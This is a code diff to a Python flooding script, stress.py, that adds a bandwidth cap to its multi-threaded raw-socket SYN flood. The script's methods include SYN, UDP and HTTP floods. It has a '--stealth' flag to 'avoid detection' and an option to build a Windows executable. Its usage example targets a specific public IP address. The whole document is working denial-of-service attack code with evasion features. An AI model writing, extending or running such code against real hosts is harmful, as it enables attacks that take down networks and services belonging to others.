@@ -118,8 +118,17 @@ class LiveMonitor:
 # ---------------------------------------------------------------------------
 # SYN flood — multi-threaded, each thread has its own raw socket
 # ---------------------------------------------------------------------------
-def syn_flood(target: str, dur: int, stealth: bool = False, monitor: bool = False):
-    log(f"syn{' stealth' if stealth else ''} on {target} ({dur}s)")
+def syn_flood(
+    target: str,
+    dur: int,
+    stealth: bool = False,
+    monitor: bool = False,
+    limit_mbps: int = 0,
+):
+    log(
+        f"syn{' stealth' if stealth else ''} on {target} ({dur}s)"
+        + (f", limit {limit_mbps}Mbps" if limit_mbps else "")
+    )
     if IS_WIN:
         log("windows: use scapy fallback — install Npcap then: pip install scapy")
         return
@@ -151,6 +160,11 @@ def syn_flood(target: str, dur: int, stealth: bool = False, monitor: bool = Fals
     if mon:
         threading.Thread(target=mon.run, daemon=True).start()
 
+    # rate limit setup
+    pkts_per_mbps = 3125  # 40-byte packets
+    max_rate = limit_mbps * pkts_per_mbps if limit_mbps else 0
+    throttle_interval = max(0, 1.0 / (max_rate / n_threads)) if max_rate else 0
+
     # pre-fill all thread buffers
     for i in range(n_threads):
         thread_buffers[i] = [factory.get() for _ in range(batch_size)]
@@ -161,9 +175,9 @@ def syn_flood(target: str, dur: int, stealth: bool = False, monitor: bool = Fals
         buf = thread_buffers[tid]
         end = time.time() + dur
         cnt = 0
+        last_send = time.time()
         while time.time() < end and not stop.is_set():
             if not buf:
-                # replenish from factory
                 with buf_lock:
                     if thread_buffers[tid]:
                         buf = thread_buffers[tid]
@@ -175,7 +189,11 @@ def syn_flood(target: str, dur: int, stealth: bool = False, monitor: bool = Fals
                 cnt += 1
                 if stealth and cnt % max(1, int(150000 / n_threads)) == 0:
                     time.sleep(random.uniform(0.3, 1.0))
-                # update shared total every 1000 pkts
+                if throttle_interval and cnt % 100 == 0:
+                    elapsed = time.time() - last_send
+                    if elapsed < throttle_interval * 100:
+                        time.sleep(throttle_interval * 100 - elapsed)
+                    last_send = time.time()
                 if cnt % 1000 == 0:
                     with sent_lock:
                         total_sent[0] += 1000
@@ -404,13 +422,23 @@ if __name__ == "__main__":
     flags = [a for a in sys.argv[1:] if a.startswith("--")]
     stealth = "--stealth" in flags or "--slow" in flags
     monitor = "--monitor" in flags or "--watch" in flags or "-m" in flags
+    limit_mbps = 0
+    for f in flags:
+        if f.startswith("--limit="):
+            try:
+                limit_mbps = int(f.split("=")[1])
+            except:
+                pass
 
     if not args or "-h" in sys.argv or "--help" in sys.argv:
         print("  usage: python3 stress.py <target> <method> [duration] [flags]")
         print("  methods: syn, udp, http, all, verify")
-        print("  flags:   --stealth   slow down to avoid detection")
-        print("           --monitor   show live ping latency")
-        print("           --install   build Windows .exe")
+        print("  flags:   --stealth       slow down to avoid detection")
+        print("           --monitor       show live ping latency")
+        print("           --limit=10      cap at 10 Mbps (save your WiFi)")
+        print("           --install       build Windows .exe")
+        print("  example:")
+        print("    sudo python3 stress.py 217.45.28.154 syn 60 --limit=20 --monitor")
         sys.exit(0)
 
     if "--install" in sys.argv:
@@ -429,10 +457,12 @@ if __name__ == "__main__":
         print(f"  stealth:  on")
     if monitor:
         print(f"  monitor:  on")
+    if limit_mbps:
+        print(f"  limit:    {limit_mbps} Mbps")
     print()
 
     table = {
-        "syn": lambda: syn_flood(target, dur, stealth, monitor),
+        "syn": lambda: syn_flood(target, dur, stealth, monitor, limit_mbps),
         "udp": lambda: udp_flood(target, dur),
         "http": lambda: http_flood(target, dur),
         "all": lambda: all_at_once(target, dur),
